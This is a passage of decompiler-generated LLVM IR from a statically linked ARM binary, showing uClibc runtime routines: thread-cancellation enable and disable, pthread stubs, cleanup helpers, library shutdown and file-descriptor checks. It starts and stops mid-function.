  br i1 %v2_1df68, label %dec_label_pc_1df70, label %entry.dec_label_pc_1df8c_crit_edge

entry.dec_label_pc_1df8c_crit_edge:               ; preds = %entry
  %v3_1df8c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1df8c

dec_label_pc_1df70:                               ; preds = %entry
  %v0_1df80 = load i32, i32* @r0, align 4
  %v2_1df80 = icmp ugt i32 %v0_1df80, -4097
  br i1 %v2_1df80, label %bb8, label %bb

bb:                                               ; preds = %dec_label_pc_1df8c, %dec_label_pc_1df70
  %merge = phi i32 [ %v0_1df80, %dec_label_pc_1df70 ], [ %v0_1dfb0, %dec_label_pc_1df8c ]
  ret i32 %merge

bb8:                                              ; preds = %dec_label_pc_1df70
  %v0_1df88 = call i32 @__syscall_error()
  br label %dec_label_pc_1df8c

dec_label_pc_1df8c:                               ; preds = %entry.dec_label_pc_1df8c_crit_edge, %bb8
  %v3_1df8c = phi i32 [ %v3_1df8c.pre, %entry.dec_label_pc_1df8c_crit_edge ], [ %v0_1df88, %bb8 ]
  %v6_1df8c = load i32, i32* @r1, align 4
  %v15_1df8c = load i32, i32* @r7, align 4
  store i32 %v15_1df8c, i32* %stack_var_-8, align 4
  %v18_1df8c = load i32, i32* @lr, align 4
  %v0_1df90 = call i32 @__libc_enable_asynccancel()
  store i32 %v6_1df8c, i32* @r1, align 4
  store i32 %v3_1df8c, i32* @r7, align 4
  %v1_1dfac = call i32 @__libc_disable_asynccancel(i32 %v0_1df90)
  %v0_1dfb0 = load i32, i32* @r7, align 4
  store i32 %v0_1dfb0, i32* @r0, align 4
  %v2_1dfb4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1dfb4, i32* @r7, align 4
  store i32 %v18_1df8c, i32* @lr, align 4
  %v2_1dfb8 = icmp ugt i32 %v0_1dfb0, -4097
  br i1 %v2_1dfb8, label %bb9, label %bb

bb9:                                              ; preds = %dec_label_pc_1df8c
  %v0_1dfc0 = call i32 @__syscall_error()
  ret i32 %v0_1dfc0

; uselistorder directives
  uselistorder i32 %v0_1dfb0, { 1, 2, 0 }
  uselistorder i32 ()* @__syscall_error, { 5, 4, 11, 7, 6, 10, 1, 0, 9, 3, 2, 8 }
  uselistorder label %dec_label_pc_1df8c, { 1, 0 }
}

define i32 @__libc_disable_asynccancel(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_1dfd0 = load i32, i32* %r0.global-to-local, align 4
  %v1_1dfd0 = and i32 %v0_1dfd0, 2
  %v2_1dfd0 = icmp eq i32 %v1_1dfd0, 0
  %v3_1dfd4 = load i32, i32* @r4, align 4
  store i32 %v3_1dfd4, i32* %stack_var_-16, align 4
  br i1 %v2_1dfd0, label %dec_label_pc_1dfdc, label %dec_label_pc_1e050

dec_label_pc_1dfdc:                               ; preds = %entry
  %v0_1dfdc = call i32 @__aeabi_read_tp()
  store i32 %v0_1dfdc, i32* %r0.global-to-local, align 4
  %v1_1dfe0 = add i32 %v0_1dfdc, -1036
  %v2_1dfe0 = inttoptr i32 %v1_1dfe0 to i32*
  %v3_1dfe0 = load i32, i32* %v2_1dfe0, align 4
  %v1_1dfe4 = add i32 %v0_1dfdc, -1168
  store i32 %v1_1dfe4, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1dfe8

dec_label_pc_1dfe8:                               ; preds = %dec_label_pc_1e01c.dec_label_pc_1dfe8_crit_edge, %dec_label_pc_1dfdc
  %v0_1dff4 = phi i32 [ %v0_1dff4.pre, %dec_label_pc_1e01c.dec_label_pc_1dfe8_crit_edge ], [ %v1_1dfe4, %dec_label_pc_1dfdc ]
  %v0_1dfe8 = phi i32 [ %v0_1e01c, %dec_label_pc_1e01c.dec_label_pc_1dfe8_crit_edge ], [ %v3_1dfe0, %dec_label_pc_1dfdc ]
  %v1_1dfe8 = and i32 %v0_1dfe8, -3
  store i32 %v1_1dfe8, i32* %r7.global-to-local, align 4
  store i32 %v0_1dfe8, i32* %r4.global-to-local, align 4
  store i32 %v1_1dfe8, i32* @r1, align 4
  %v1_1dff4 = add i32 %v0_1dff4, 132
  store i32 %v1_1dff4, i32* @r2, align 4
  %v1_1dff823 = inttoptr i32 %v1_1dff4 to i32*
  %v2_1dff824 = load i32, i32* %v1_1dff823, align 4
  %v3_1dffc26 = icmp uge i32 %v2_1dff824, %v0_1dfe8
  store i1 %v3_1dffc26, i1* %cpsr_c.global-to-local, align 1
  %v9_1dffc32 = icmp eq i32 %v2_1dff824, %v0_1dfe8
  br i1 %v9_1dffc32, label %dec_label_pc_1e004, label %dec_label_pc_1e01c

dec_label_pc_1e004:                               ; preds = %dec_label_pc_1dfe8, %dec_label_pc_1e004.dec_label_pc_1dff8_crit_edge
  %v0_1e00433 = phi i32 [ %v1_1dffc.pre, %dec_label_pc_1e004.dec_label_pc_1dff8_crit_edge ], [ %v0_1dfe8, %dec_label_pc_1dfe8 ]
  store i32 %v0_1e00433, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1e014 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1e014, label %dec_label_pc_1e018, label %dec_label_pc_1e004.dec_label_pc_1dff8_crit_edge

dec_label_pc_1e004.dec_label_pc_1dff8_crit_edge:  ; preds = %dec_label_pc_1e004
  %v0_1dff8.pre = load i32, i32* @r2, align 4
  %v1_1dffc.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1dff8 = inttoptr i32 %v0_1dff8.pre to i32*
  %v2_1dff8 = load i32, i32* %v1_1dff8, align 4
  %v3_1dffc = icmp uge i32 %v2_1dff8, %v1_1dffc.pre
  store i1 %v3_1dffc, i1* %cpsr_c.global-to-local, align 1
  %v9_1dffc = icmp eq i32 %v2_1dff8, %v1_1dffc.pre
  br i1 %v9_1dffc, label %dec_label_pc_1e004, label %dec_label_pc_1e01c

dec_label_pc_1e018:                               ; preds = %dec_label_pc_1e004
  %v0_1e018 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1e01c

dec_label_pc_1e01c:                               ; preds = %dec_label_pc_1dfe8, %dec_label_pc_1e004.dec_label_pc_1dff8_crit_edge, %dec_label_pc_1e018
  %v0_1e01c = phi i32 [ %v0_1e018, %dec_label_pc_1e018 ], [ %v2_1dff824, %dec_label_pc_1dfe8 ], [ %v2_1dff8, %dec_label_pc_1e004.dec_label_pc_1dff8_crit_edge ]
  %v1_1e01c = phi i32 [ %v0_1e018, %dec_label_pc_1e018 ], [ %v0_1dfe8, %dec_label_pc_1dfe8 ], [ %v1_1dffc.pre, %dec_label_pc_1e004.dec_label_pc_1dff8_crit_edge ]
  %v3_1e01c = icmp uge i32 %v0_1e01c, %v1_1e01c
  store i1 %v3_1e01c, i1* %cpsr_c.global-to-local, align 1
  %v9_1e01c = icmp eq i32 %v0_1e01c, %v1_1e01c
  br i1 %v9_1e01c, label %dec_label_pc_1e044.preheader, label %dec_label_pc_1e01c.dec_label_pc_1dfe8_crit_edge

dec_label_pc_1e01c.dec_label_pc_1dfe8_crit_edge:  ; preds = %dec_label_pc_1e01c
  %v0_1dff4.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1dfe8

dec_label_pc_1e044.preheader:                     ; preds = %dec_label_pc_1e01c
  %v0_1e0441 = load i32, i32* %r7.global-to-local, align 4
  %v1_1e0442 = and i32 %v0_1e0441, 12
  store i32 %v1_1e0442, i32* @r3, align 4
  %v2_1e0483 = icmp ugt i32 %v1_1e0442, 3
  store i1 %v2_1e0483, i1* %cpsr_c.global-to-local, align 1
  %v7_1e0485 = icmp eq i32 %v1_1e0442, 4
  br i1 %v7_1e0485, label %dec_label_pc_1e028.lr.ph, label %dec_label_pc_1e044.preheader.dec_label_pc_1e050.loopexit_crit_edge

dec_label_pc_1e044.preheader.dec_label_pc_1e050.loopexit_crit_edge: ; preds = %dec_label_pc_1e044.preheader
  %v1_1e054.pre.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1e050.loopexit

dec_label_pc_1e028.lr.ph:                         ; preds = %dec_label_pc_1e044.preheader
  %v0_1e02c.pre = load i32, i32* %r5.global-to-local, align 4
  %v1_1e02c = add i32 %v0_1e02c.pre, 132
  %v2_1e040 = inttoptr i32 %v1_1e02c to i32*
  br label %dec_label_pc_1e028

dec_label_pc_1e028:                               ; preds = %dec_label_pc_1e028.lr.ph, %dec_label_pc_1e028
  %v0_1e028 = phi i32 [ %v0_1e0441, %dec_label_pc_1e028.lr.ph ], [ %v3_1e040, %dec_label_pc_1e028 ]
  store i32 %v0_1e028, i32* @r2, align 4
  store i32 %v1_1e02c, i32* %r0.global-to-local, align 4
  store i32 128, i32* @r1, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  %v3_1e040 = load i32, i32* %v2_1e040, align 4
  store i32 %v3_1e040, i32* %r7.global-to-local, align 4
  %v1_1e044 = and i32 %v3_1e040, 12
  store i32 %v1_1e044, i32* @r3, align 4
  %v7_1e048 = icmp eq i32 %v1_1e044, 4
  br i1 %v7_1e048, label %dec_label_pc_1e028, label %dec_label_pc_1e044.dec_label_pc_1e050.loopexit_crit_edge

dec_label_pc_1e044.dec_label_pc_1e050.loopexit_crit_edge: ; preds = %dec_label_pc_1e028
  %v2_1e048 = icmp ugt i32 %v1_1e044, 3
  store i1 %v2_1e048, i1* %cpsr_c.global-to-local, align 1
  br label %dec_label_pc_1e050.loopexit

dec_label_pc_1e050.loopexit:                      ; preds = %dec_label_pc_1e044.preheader.dec_label_pc_1e050.loopexit_crit_edge, %dec_label_pc_1e044.dec_label_pc_1e050.loopexit_crit_edge
  %v1_1e054.pre = phi i32 [ %v1_1e054.pre.pre, %dec_label_pc_1e044.preheader.dec_label_pc_1e050.loopexit_crit_edge ], [ %v1_1e02c, %dec_label_pc_1e044.dec_label_pc_1e050.loopexit_crit_edge ]
  %v2_1e050.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_1e050

dec_label_pc_1e050:                               ; preds = %dec_label_pc_1e050.loopexit, %entry
  %v1_1e054 = phi i32 [ %v1_1e054.pre, %dec_label_pc_1e050.loopexit ], [ %v0_1dfd0, %entry ]
  %v2_1e050 = phi i32 [ %v2_1e050.pre, %dec_label_pc_1e050.loopexit ], [ %v3_1dfd4, %entry ]
  store i32 %v2_1e050, i32* @r4, align 4
  ret i32 %v1_1e054

; uselistorder directives
  uselistorder i32 %v3_1e040, { 1, 2, 0 }
  uselistorder i32 %v1_1e02c, { 0, 2, 1 }
  uselistorder i32 %v0_1e018, { 1, 0 }
  uselistorder i32 %v1_1dffc.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1dfe8, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 5, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 2, 0, 3, 5, 4, 1 }
  uselistorder label %dec_label_pc_1e050.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_1e028, { 1, 0 }
  uselistorder label %dec_label_pc_1e01c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1e004, { 1, 0 }
}

define i32 @__libc_enable_asynccancel() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_1e058 = load i32, i32* @r4, align 4
  store i32 %v3_1e058, i32* %stack_var_-24, align 4
  store i32 57244, i32* %r8.global-to-local, align 4
  %v0_1e060 = call i32 @__aeabi_read_tp()
  %v1_1e064 = add i32 %v0_1e060, -1036
  %v2_1e064 = inttoptr i32 %v1_1e064 to i32*
  %v3_1e064 = load i32, i32* %v2_1e064, align 4
  store i32 %v3_1e064, i32* %r6.global-to-local, align 4
  %v1_1e068 = add i32 %v0_1e060, -1168
  store i32 %v1_1e068, i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32* %r8.global-to-local, align 4
  %v1_1e07046 = or i32 %v3_1e064, 2
  store i32 %v1_1e07046, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1e07449 = icmp eq i32 %v1_1e07046, %v3_1e064
  br i1 %v9_1e07449, label %dec_label_pc_1e120, label %dec_label_pc_1e07c

dec_label_pc_1e07c:                               ; preds = %entry, %bb.dec_label_pc_1e07c_crit_edge
  %v0_1e080 = phi i32 [ %v0_1e080.pre, %bb.dec_label_pc_1e07c_crit_edge ], [ %v1_1e068, %entry ]
  %v1_1e07051 = phi i32 [ %v1_1e070, %bb.dec_label_pc_1e07c_crit_edge ], [ %v1_1e07046, %entry ]
  %v0_1e08450 = phi i32 [ %v1_1e0b0, %bb.dec_label_pc_1e07c_crit_edge ], [ %v3_1e064, %entry ]
  store i32 %v1_1e07051, i32* @r1, align 4
  %v1_1e080 = add i32 %v0_1e080, 132
  store i32 %v1_1e080, i32* %r2.global-to-local, align 4
  store i32 %v0_1e08450, i32* %r4.global-to-local, align 4
  %v1_1e08834 = inttoptr i32 %v1_1e080 to i32*
  %v2_1e08835 = load i32, i32* %v1_1e08834, align 4
  store i32 %v2_1e08835, i32* @r3, align 4
  %v3_1e08c37 = icmp uge i32 %v2_1e08835, %v0_1e08450
  store i1 %v3_1e08c37, i1* %cpsr_c.global-to-local, align 1
  %v9_1e08c43 = icmp eq i32 %v2_1e08835, %v0_1e08450
  br i1 %v9_1e08c43, label %dec_label_pc_1e094, label %dec_label_pc_1e0ac

dec_label_pc_1e094:                               ; preds = %dec_label_pc_1e07c, %dec_label_pc_1e094.dec_label_pc_1e088_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_1e0a4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1e0a4, label %dec_label_pc_1e0a8, label %dec_label_pc_1e094.dec_label_pc_1e088_crit_edge

dec_label_pc_1e094.dec_label_pc_1e088_crit_edge:  ; preds = %dec_label_pc_1e094
  %v0_1e088.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1e08c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1e088 = inttoptr i32 %v0_1e088.pre to i32*
  %v2_1e088 = load i32, i32* %v1_1e088, align 4
  store i32 %v2_1e088, i32* @r3, align 4
  %v3_1e08c = icmp uge i32 %v2_1e088, %v1_1e08c.pre
  store i1 %v3_1e08c, i1* %cpsr_c.global-to-local, align 1
  %v9_1e08c = icmp eq i32 %v2_1e088, %v1_1e08c.pre
  br i1 %v9_1e08c, label %dec_label_pc_1e094, label %dec_label_pc_1e0ac

dec_label_pc_1e0a8:                               ; preds = %dec_label_pc_1e094
  %v0_1e0a8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1e0a8, i32* @r3, align 4
  br label %dec_label_pc_1e0ac

dec_label_pc_1e0ac:                               ; preds = %dec_label_pc_1e07c, %dec_label_pc_1e094.dec_label_pc_1e088_crit_edge, %dec_label_pc_1e0a8
  %v1_1e0b0 = phi i32 [ %v0_1e0a8, %dec_label_pc_1e0a8 ], [ %v2_1e08835, %dec_label_pc_1e07c ], [ %v2_1e088, %dec_label_pc_1e094.dec_label_pc_1e088_crit_edge ]
  %v1_1e0ac = load i32, i32* %r6.global-to-local, align 4
  %v3_1e0ac = icmp uge i32 %v1_1e0b0, %v1_1e0ac
  store i1 %v3_1e0ac, i1* %cpsr_c.global-to-local, align 1
  %v9_1e0ac = icmp eq i32 %v1_1e0b0, %v1_1e0ac
  br i1 %v9_1e0ac, label %dec_label_pc_1e0b8, label %bb

bb:                                               ; preds = %dec_label_pc_1e0ac
  store i32 %v1_1e0b0, i32* %r6.global-to-local, align 4
  %v1_1e070 = or i32 %v1_1e0b0, 2
  store i32 %v1_1e070, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1e074 = icmp eq i32 %v1_1e070, %v1_1e0b0
  br i1 %v9_1e074, label %dec_label_pc_1e120, label %bb.dec_label_pc_1e07c_crit_edge

bb.dec_label_pc_1e07c_crit_edge:                  ; preds = %bb
  %v0_1e080.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1e07c

dec_label_pc_1e0b8:                               ; preds = %dec_label_pc_1e0ac
  %v0_1e0b8 = load i32, i32* %r5.global-to-local, align 4
  %v1_1e0b8 = and i32 %v0_1e0b8, -69
  store i32 %v1_1e0b8, i32* @r3, align 4
  %v2_1e0bc = icmp ugt i32 %v1_1e0b8, 9
  store i1 %v2_1e0bc, i1* %cpsr_c.global-to-local, align 1
  %v7_1e0bc = icmp eq i32 %v1_1e0b8, 10
  br i1 %v7_1e0bc, label %dec_label_pc_1e0c4, label %dec_label_pc_1e120

dec_label_pc_1e0c4:                               ; preds = %dec_label_pc_1e0b8
  %v1_1e0c8 = load i32, i32* %r7.global-to-local, align 4
  %v2_1e0c8 = add i32 %v1_1e0c8, 544
  %v3_1e0c8 = inttoptr i32 %v2_1e0c8 to i32*
  store i32 -1, i32* %v3_1e0c8, align 4
  %v0_1e0cc = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_1e0cc, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1e0d0

dec_label_pc_1e0d0:                               ; preds = %dec_label_pc_1e104.dec_label_pc_1e0d0_crit_edge, %dec_label_pc_1e0c4
  %v0_1e0d4 = phi i32 [ %v0_1e0d4.pre, %dec_label_pc_1e104.dec_label_pc_1e0d0_crit_edge ], [ %v0_1e0cc, %dec_label_pc_1e0c4 ]
  %v0_1e0d0 = load i32, i32* %r7.global-to-local, align 4
  %v1_1e0d0 = add i32 %v0_1e0d0, 132
  %v2_1e0d0 = inttoptr i32 %v1_1e0d0 to i32*
  %v3_1e0d0 = load i32, i32* %v2_1e0d0, align 4
  store i32 %v0_1e0d4, i32* %r2.global-to-local, align 4
  store i32 %v3_1e0d0, i32* %r4.global-to-local, align 4
  %v1_1e0dc = or i32 %v3_1e0d0, 16
  store i32 %v1_1e0dc, i32* @r1, align 4
  %v1_1e0e022 = inttoptr i32 %v0_1e0d4 to i32*
  %v2_1e0e023 = load i32, i32* %v1_1e0e022, align 4
  %v3_1e0e425 = icmp uge i32 %v2_1e0e023, %v3_1e0d0
  store i1 %v3_1e0e425, i1* %cpsr_c.global-to-local, align 1
  %v9_1e0e431 = icmp eq i32 %v2_1e0e023, %v3_1e0d0
  br i1 %v9_1e0e431, label %dec_label_pc_1e0ec, label %dec_label_pc_1e104

dec_label_pc_1e0ec:                               ; preds = %dec_label_pc_1e0d0, %dec_label_pc_1e0ec.dec_label_pc_1e0e0_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_1e0fc = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1e0fc, label %dec_label_pc_1e100, label %dec_label_pc_1e0ec.dec_label_pc_1e0e0_crit_edge

dec_label_pc_1e0ec.dec_label_pc_1e0e0_crit_edge:  ; preds = %dec_label_pc_1e0ec
  %v0_1e0e0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1e0e4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1e0e0 = inttoptr i32 %v0_1e0e0.pre to i32*
  %v2_1e0e0 = load i32, i32* %v1_1e0e0, align 4
  %v3_1e0e4 = icmp uge i32 %v2_1e0e0, %v1_1e0e4.pre
  store i1 %v3_1e0e4, i1* %cpsr_c.global-to-local, align 1
  %v9_1e0e4 = icmp eq i32 %v2_1e0e0, %v1_1e0e4.pre
  br i1 %v9_1e0e4, label %dec_label_pc_1e0ec, label %dec_label_pc_1e104

dec_label_pc_1e100:                               ; preds = %dec_label_pc_1e0ec
  %v0_1e100 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1e104

dec_label_pc_1e104:                               ; preds = %dec_label_pc_1e0d0, %dec_label_pc_1e0ec.dec_label_pc_1e0e0_crit_edge, %dec_label_pc_1e100
  %v0_1e104 = phi i32 [ %v0_1e100, %dec_label_pc_1e100 ], [ %v2_1e0e023, %dec_label_pc_1e0d0 ], [ %v2_1e0e0, %dec_label_pc_1e0ec.dec_label_pc_1e0e0_crit_edge ]
  %v1_1e104 = phi i32 [ %v0_1e100, %dec_label_pc_1e100 ], [ %v3_1e0d0, %dec_label_pc_1e0d0 ], [ %v1_1e0e4.pre, %dec_label_pc_1e0ec.dec_label_pc_1e0e0_crit_edge ]
  %v3_1e104 = icmp uge i32 %v0_1e104, %v1_1e104
  store i1 %v3_1e104, i1* %cpsr_c.global-to-local, align 1
  %v9_1e104 = icmp eq i32 %v0_1e104, %v1_1e104
  br i1 %v9_1e104, label %dec_label_pc_1e10c, label %dec_label_pc_1e104.dec_label_pc_1e0d0_crit_edge

dec_label_pc_1e104.dec_label_pc_1e0d0_crit_edge:  ; preds = %dec_label_pc_1e104
  %v0_1e0d4.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1e0d0

dec_label_pc_1e10c:                               ; preds = %dec_label_pc_1e104
  store i32 116, i32* @r3, align 4
  %v0_1e114 = load i32, i32* %r8.global-to-local, align 4
  %v2_1e114 = add i32 %v0_1e114, 116
  %v3_1e114 = inttoptr i32 %v2_1e114 to i32*
  %v4_1e114 = load i32, i32* %v3_1e114, align 4
  store i32 %v4_1e114, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_1e114)
  %v0_1e120.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1e120

dec_label_pc_1e120:                               ; preds = %entry, %bb, %dec_label_pc_1e0b8, %dec_label_pc_1e10c
  %v0_1e120 = phi i32 [ %v1_1e0b0, %dec_label_pc_1e0b8 ], [ %v0_1e120.pre, %dec_label_pc_1e10c ], [ %v3_1e064, %entry ], [ %v1_1e0b0, %bb ]
  %v2_1e124 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_1e124, i32* @r4, align 4
  ret i32 %v0_1e120

; uselistorder directives
  uselistorder i32 %v0_1e100, { 1, 0 }
  uselistorder i32 %v1_1e0e4.pre, { 0, 2, 1 }
  uselistorder i32 %v1_1e070, { 1, 2, 0 }
  uselistorder i32 %v1_1e0ac, { 1, 0 }
  uselistorder i32 %v1_1e0b0, { 0, 1, 4, 3, 5, 6, 7, 2 }
  uselistorder i32 %v1_1e08c.pre, { 1, 0 }
  uselistorder i32 %v0_1e08450, { 2, 1, 0 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i1* %cpsr_c.global-to-local, { 3, 5, 4, 0, 6, 10, 7, 9, 8, 1, 2 }
  uselistorder i32 -1036, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1e120, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1e104, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1e0ec, { 1, 0 }
  uselistorder label %dec_label_pc_1e0ac, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1e094, { 1, 0 }
  uselistorder label %dec_label_pc_1e07c, { 1, 0 }
}

define i32 @__pthread_return_0() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_mutex_init() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @_pthread_cleanup_push_defer(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %arg1, align 4
  %v3_1e144 = add i32 %tmp, 4
  %v4_1e144 = inttoptr i32 %v3_1e144 to i32*
  store i32 %arg3, i32* %v4_1e144, align 4
  ret i32 %tmp
}

define i32 @_pthread_cleanup_pop_restore(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_1e150 = icmp eq i32 %arg2, 0
  br i1 %v2_1e150, label %.thread1, label %bb

bb:                                               ; preds = %entry
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %v3_1e168 = call i32 @__libc_errno()
  ret i32 %v3_1e168

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI___uClibc_fini() local_unnamed_addr {
dec_label_pc_1e19c.lr.ph:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1e178 = load i32, i32* @r4, align 4
  store i32 %v3_1e178, i32* %stack_var_-16, align 4
  store i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32* %r5.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 -8), i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1e19c

dec_label_pc_1e19c:                               ; preds = %dec_label_pc_1e19c.dec_label_pc_1e19c_crit_edge, %dec_label_pc_1e19c.lr.ph
  %v1_1e19c = phi i32 [ %v1_1e1a8, %dec_label_pc_1e19c.dec_label_pc_1e19c_crit_edge ], [ 0, %dec_label_pc_1e19c.lr.ph ]
  %v0_1e19c = phi i32 [ %v0_1e19c.pre, %dec_label_pc_1e19c.dec_label_pc_1e19c_crit_edge ], [ add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 -8), %dec_label_pc_1e19c.lr.ph ]
  %v4_1e19c = mul i32 %v1_1e19c, 4
  %v5_1e19c = add i32 %v4_1e19c, %v0_1e19c
  %v6_1e19c = inttoptr i32 %v5_1e19c to i32*
  %v7_1e19c = load i32, i32* %v6_1e19c, align 4
  call void @__pseudo_branch(i32 %v7_1e19c)
  %v0_1e1a8 = load i32, i32* %r4.global-to-local, align 4
  %v1_1e1a8 = add i32 %v0_1e1a8, -1
  store i32 %v1_1e1a8, i32* %r4.global-to-local, align 4
  %v2_1e1a8 = icmp eq i32 %v0_1e1a8, 0
  br i1 %v2_1e1a8, label %dec_label_pc_1e1b0, label %dec_label_pc_1e19c.dec_label_pc_1e19c_crit_edge

dec_label_pc_1e19c.dec_label_pc_1e19c_crit_edge:  ; preds = %dec_label_pc_1e19c
  %v0_1e19c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1e19c

dec_label_pc_1e1b0:                               ; preds = %dec_label_pc_1e19c
  %v0_1e1b4.pre = load i32, i32* %r5.global-to-local, align 4
  %v2_1e1b4 = add i32 %v0_1e1b4.pre, 2044
  %v3_1e1b4 = inttoptr i32 %v2_1e1b4 to i32*
  %v4_1e1b4 = load i32, i32* %v3_1e1b4, align 4
  %v2_1e1b8 = icmp eq i32 %v4_1e1b4, 0
  br i1 %v2_1e1b8, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_1e1b0
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_1e1b0, %bb
  %v2_1e1c0 = xor i1 %v2_1e1b8, true
  call void @__pseudo_cond_branch(i1 %v2_1e1c0, i32 %v4_1e1b4)
  %v0_1e1c8 = load i32, i32* %r5.global-to-local, align 4
  %v2_1e1c8 = add i32 %v0_1e1c8, 2048
  %v3_1e1c8 = inttoptr i32 %v2_1e1c8 to i32*
  %v4_1e1c8 = load i32, i32* %v3_1e1c8, align 4
  %v2_1e1cc = icmp eq i32 %v4_1e1c8, 0
  br i1 %v2_1e1cc, label %bb19, label %bb18

bb18:                                             ; preds = %bb17
  br label %bb19

bb19:                                             ; preds = %bb17, %bb18
  %v2_1e1d4 = xor i1 %v2_1e1cc, true
  call void @__pseudo_cond_branch(i1 %v2_1e1d4, i32 %v4_1e1c8)
  %v2_1e1d8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1e1d8, i32* %r4.global-to-local, align 4
  %v1_1e1dc = load i32, i32* @r0, align 4
  ret i32 %v1_1e1dc

; uselistorder directives
  uselistorder i32 %v1_1e1a8, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__check_one_fd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_1e1f4 = load i32, i32* @r4, align 4
  %v6_1e1f4 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  %v2_1e208 = call i32 @__libc_fcntl(i32 %arg1, i32 1)
  %v3_1e210 = icmp eq i32 %v2_1e208, -1
  store i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32* @r3, align 4
  br i1 %v3_1e210, label %dec_label_pc_1e21c, label %dec_label_pc_1e234

dec_label_pc_1e21c:                               ; preds = %entry
  %v0_1e220 = load i32, i32* @r5, align 4
  %v2_1e228 = call i32 @__libc_open(i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 -35252), i32 %v0_1e220)
  %v1_1e22c = load i32, i32* @r4, align 4
  %v1_1e230 = icmp ne i32 %v2_1e228, %v1_1e22c
  call void @__pseudo_cond_branch(i1 %v1_1e230, i32 ptrtoint (i32* @global_var_1c964.613 to i32))
